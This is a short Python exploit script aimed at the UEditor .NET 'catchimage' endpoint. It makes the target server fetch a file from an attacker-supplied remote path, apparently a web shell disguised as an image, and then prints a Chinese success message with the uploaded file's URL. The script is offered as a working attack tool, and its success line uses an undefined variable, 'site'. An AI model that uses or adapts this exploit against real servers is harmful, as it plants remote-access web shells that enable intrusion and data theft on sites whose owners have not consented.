import requests
import re
import sys


def upload(url, shellpath):
    photo_shell = shellpath
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1'
        }
    req = requests.post(url=url+'?action=catchimage',headers=headers,data='source[]='+photo_shell,verify=False, timeout=5)
    info = req.json()
    print(info)
    if info['state'] == 'SUCCESS':
        print('[+] 上传成功！ 请查看响应包内容！',  site+"/ueditor/net/" + info['list'][0]['url'])
  
        
        
if __name__=="__main__":
    url = sys.argv[1]
    imgpath = sys.argv[2]
    upload(url, imgpath)
